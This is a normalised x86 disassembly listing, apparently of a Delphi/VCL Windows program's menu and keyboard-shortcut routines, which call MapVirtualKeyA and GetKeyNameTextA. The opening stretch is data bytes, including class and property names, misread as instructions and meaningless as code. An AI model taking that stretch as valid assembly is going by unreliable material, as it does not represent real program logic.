xor al 0x40
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax ] dh
pop [ esi ]
mov esp 0x64004194
push ss
inc edx
add al bl
xchg ebx eax
inc ecx
add [ eax - 0x69 ] bl
inc esi
add ah dh
xchg edi eax
inc esi
add [ edi + edx + 0x42 ] cl
add [ eax + ebx + 0x42 ] al
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ esi + ecx * 4 - 0x68bfffba ] dl
inc esi
add [ eax ] dh
popfd
inc esi
add [ esp + ebx * 4 + 0x46 ] dh
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
sar [ eax ] 0x4c
inc esi
add [ edi ] al
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0xec756e65
dec ebx
inc esi
add [ eax + 0x4b ] ah
inc esi
add [ ebx ] cl
add [ 0x756e654d ] al
jae r-xdata
inc eax
add ah ch
dec ebx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
dec esp
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
dec esp
inc esi
add [ eax ] ah
add [ eax ] al
lodsb [ esi ]
dec edx
inc esi
add [ edx + ebx + 0x42 ] bl
adc [ ecx ] ch
inc esi
add [ eax ] cl
add bh bh
mov eax 0x1004697
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060007 ] al
mov [ ebp + 0x46 ] al
add [ esp + ebx * 4 ] dh
inc esi
add [ esp + ebx * 4 + 0x46 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
adc [ eax ] al
inc eax
add [ eax ] al
insd
popad
jae r-xdata
dec ecx
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
call [ esp + ebx * 4 + 0x46 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x75410900
je r-xdata
inc eax
add [ ecx ] al
add bh bh
mov al 0x9b
inc esi
add [ ecx ] al
dec ebp
jb r-xdata
je r-xdata
outsb
je r-xdata
popad
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1065646f
sub [ esi ] eax
dec eax
add [ eax ] al
test al 0x5e
inc ecx
add [ eax ] dh
add [ eax ] al
[ ebx + ebx * 4 - 0x6b6bffba ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080006 ] al
add [ esi + 0x46 ] cl
add [ 0x654c616d ] cl
je r-xdata
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x600464d ] al
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9465646f
inc ebx
inc esi
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
inc ebx
push 0x65676e61
nop
test [ ebp + 0x46 ] cl
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
push [ eax + 0x100469b ]
dec esi
inc esi
add [ ebp + 0x4ed00040 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
les ecx [ ebp + 0x46 ]
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
jne r-xdata
add al 0x4e
jo r-xdata
add [ esp + ebx * 4 ] dh
inc esi
add [ esp + ebx * 4 + 0x46 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
or eax 0x6f42616d
insd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ esp + ebx * 4 ] dl
inc esi
add [ esp + ebx * 4 ] ah
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
movsb [ edi ] [ esi ]
inc esi
add [ esp + edx * 4 + 0x16640041 ] bh
inc edx
add al bl
xchg ebx eax
inc ecx
add [ eax - 0x69 ] bl
inc esi
add ah dh
xchg edi eax
inc esi
add [ edi + edx + 0x42 ] cl
add [ eax + ebx + 0x42 ] al
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ ebx - 0x68bfffba ] bh
add [ eax + 0x30004031 ] ah
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx * 2 ] dl
inc esi
add [ eax ] bh
add [ eax ] al
lodsb [ esi ]
dec edx
inc esi
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
outsd
inc edx
outsd
je r-xdata
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
push esp
outsd
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
add [ eax + 0x48004213 ] dh
xor al 0x40
pop esp
sbb al [ edx ]
inc eax
and al 0x4f
inc esi
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax ] dh
inc eax
outsd
insd
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al al
dec ebp
inc esi
add [ 0x69526274 ] cl
push 0x74754274
je r-xdata
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
jl r-xdata
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add bh bh
add [ eax ] eax
jo r-xdata
jns r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
jo r-xdata
outsd
insb
dec esi
inc esi
je r-xdata
jne r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
push cs
push eax
popad
push [ eax + 0x100469b ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
adc [ ecx ] ch
inc esi
add [ eax ] cl
add bh bh
mov eax 0x1004697
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8465646f
pop edi
inc ecx
pop esi
inc ecx
add [ eax ] dh
add [ eax ] al
[ ebx + ebx * 4 - 0x6b6bffba ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
add [ eax - 0x5c ] bh
inc esi
add [ eax + 0x10046a4 ] al
add [ eax ] al
test [ edi + 0x41 ] bl
mov [ ebp + 0x46 ] al
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
outsb
jne r-xdata
andps xmm1 [ ebp + 0x65 ]
outsb
inc esi
add [ ebx ] al
dec esi
xor al 0x40
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx * 2 ] ah
inc esi
add [ eax ] al
je r-xdata
outsd
dec esp
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc065646f
dec ebp
inc esi
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ecx
je r-xdata
inc ebx
push 0x65676e61
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
dec esi
inc esi
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
inc esi
add [ edi + ecx * 4 - 0x688fffba ] al
inc esi
add [ esp + 0x46 ] ah
add [ 0x540a0046 ] bl
push eax
outsd
jo r-xdata
xchg edi eax
dec esi
inc esi
add [ eax + 0x4b ] ah
inc esi
add [ eax ] dl
add [ 0x756e654d ] al
jae r-xdata
outsb
add eax 0x756e654d
jae r-xdata
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
shl [ ecx + edx * 2 + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ecx + 0x46 ] dl
add [ eax + eax ] dl
add [ eax ] al
je r-xdata
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x74 ] cl
inc ecx
add ah ch
lea eax [ ecx ]
sub al 0x90
inc ecx
add [ esp + ecx * 4 - 0x72e7ffbf ] bl
inc ecx
add [ esi + ebx * 4 ] dh
inc esi
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
add [ ebp + 0x41 ] dh
outsb
xchg esp eax
inc ebx
inc esi
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
mov [ ebp + 0x46 ] al
add [ eax + 0x6000464d ] al
add [ eax ] al
jmp [ eax ]
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_459c34
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
add [ eax ] cl
add [ eax ] al
add [ eax - 0x3d ] bh
inc edx
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x1c0042c4 ] bh
lds eax [ edx ]
cld
les eax [ edx ]
call 0xe4694b1
push esp
dec ebp
outsb
jne r-xdata
mov eax 0x1c0042c4
push ecx
inc esi
imul esi [ ebx + 0x74 ] 0x4651e090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_46522c
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_4542c4
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_459c34
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_465284
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_4652bc
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403f7c
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_4041ec
sub_465310
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_4654f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404014
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_404164
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404014
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_404014
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_404164
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_404164
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403f7c
mov eax esi
call sub_403f7c
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_404014
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_4081bc
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404288
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_4652bc
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404244
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404014
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404244
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404244
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404244
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465500
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403fa0
retn
sub_465514
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_40423c
push eax
mov eax edi
call sub_40423c
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40423c
push eax
mov eax edi
call sub_40443c
push eax
mov eax [ esi ]
call sub_40443c
pop edx
pop ecx
call sub_40809c
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_40423c
mov ecx eax
mov eax esi
mov edx 0x1
call sub_4044dc
sub_465570
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40442c
xor eax eax
push ebp
push sub_46564b
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_465514
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_465514
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_465514
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_465514
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465652
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fa0
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_465310
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40804c
test eax eax
jne r-xdata
sub_465688
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_467c28
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_467c38
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_4656e8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_467c28
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_467c28
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_467c38
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_467c38
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_465688
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_465688
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_467c38
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_467c38
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_465834
push ebx
mov ebx eax
mov eax ebx
call sub_461ecc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40339c
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_46a7ec
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_46586c
push ebx
mov ebx eax
mov eax ebx
call sub_461ee0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40339c
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_46589c
push ebx
mov ebx eax
mov eax ebx
call sub_461ef4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40339c
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4658cc
push ebx
mov ebx eax
mov eax ebx
call sub_461f1c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40339c
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4658fc
push ebx
mov ebx eax
mov eax ebx
call sub_461f44
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40339c
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_404388
je r-xdata
mov al 0x1
pop ebx
retn
sub_465930
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_461f08
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40339c
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_46596c
push ebx
mov ebx eax
mov eax ebx
call sub_461f58
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40339c
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4659a0
push ebx
mov ebx eax
mov eax ebx
call sub_461f6c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40339c
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4659d4
push ebx
mov ebx eax
mov eax ebx
call sub_461f80
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40339c
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_465a08
push ebx
mov ebx eax
mov eax ebx
call sub_421bdc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_465a30
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_465a50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_467a90
sub_465a70
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_467b00
sub_465a90
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_467b54
sub_465ab0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_465acc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_403fd0
sub_465af0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_467c80
sub_465b10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_467c5c
sub_465b30
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_467c70
sub_465b50
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_465b7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
